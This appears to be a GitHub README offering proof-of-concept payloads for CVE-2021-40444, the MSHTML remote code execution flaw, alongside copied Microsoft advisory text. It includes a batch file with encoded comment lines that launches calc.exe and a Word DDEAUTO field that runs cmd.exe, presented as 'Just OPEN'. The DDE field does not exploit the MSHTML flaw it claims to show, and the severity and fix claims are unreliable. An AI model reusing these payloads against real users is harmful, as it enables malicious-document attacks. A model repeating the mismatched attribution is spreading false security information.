## [CVE-2021-40444](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-40444)

- - - ## Vulnerability: 
- `Microsoft MSHTML Remote Code Execution Vulnerability`
- Tested with malicious `.exe` file 

## Usage and proof:

![](https://github.com/nu11secur1ty/CVE-mitre/blob/main/CVE-2021-40444/docs/CVE-2021-40444-VLC-PWNED-GIF.gif)

## Executive Summary:

Microsoft is investigating reports of a remote code execution vulnerability in MSHTML that affects Microsoft Windows. Microsoft is aware of targeted attacks that attempt to exploit this vulnerability by using specially-crafted Microsoft Office documents.

An attacker could craft a malicious ActiveX control to be used by a Microsoft Office document that hosts the browser rendering engine. The attacker would then have to convince the user to open the malicious document. Users whose accounts are configured to have fewer user rights on the system could be less impacted than users who operate with administrative user rights.

Microsoft Defender Antivirus and Microsoft Defender for Endpoint both provide detection and protections for the known vulnerability. Customers should keep antimalware products up to date. Customers who utilize automatic updates do not need to take additional action. Enterprise customers who manage updates should select the detection build 1.349.22.0 or newer and deploy it across their environments. Microsoft Defender for Endpoint alerts will be displayed as: “Suspicious Cpl File Execution”.

Upon completion of this investigation, Microsoft will take the appropriate action to help protect our customers. This may include providing a security update through our monthly release process or providing an out-of-cycle security update, depending on customer needs.

Please see the Mitigations and Workaround sections for important information about steps you can take to protect your system from this vulnerability.

UPDATE September 14, 2021: Microsoft has released security updates to address this vulnerability. Please see the Security Updates table for the applicable update for your system. We recommend that you install these updates immediately. Please see the FAQ for important information about which updates are applicable to your system.

--------------------------------------------------------------------------------------------------------------------
## SOURCE:
- - - VLC PoC
```bat
::YAwzoRdxOk+EWAjk
::fBw5plQjdCyDJGyX8VAjFA1RQhKDLmSqEok47fvw++WXnm4rca8cTqqWiOTcca1HuhGwIaob+lllkcgDAlVRfR3L
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSzk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFA1RQhKDLmSqEok47fvw++WXnm4rca8cTqqWiOTcca1HuhGwIao72nkUndMJbA==
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
START C:\Windows\system32\calc.exe
vlc.bat
```

- - - important.docx PoC:
```docx
- Menu: 
  Insert tab -> Quick Parts -> Field
- Choose 
  = (Formula)
- Set name of the formula: 
  !Welcome! a
- PoC: 
{DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"  }
```

## Conclusion:
- Security is not checked
- Just OPEN :D

## Risk Assessment:
- This may well be a meterpreter malicious backdoor shell file
- This may well be a malicious MSI package or hidden bat file

## Status:
- Low(Medium)

## Fixed: 
- Windows 11
  
## Source:
[href](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-40444)

## Reproduce:
[href](https://github.com/nu11secur1ty/CVE-mitre/edit/main/CVE-2021-40444)

## Demo docx:
[href](https://streamable.com/2qa8ff)

## Demo VLC:
[href](https://streamable.com/gh2jio)
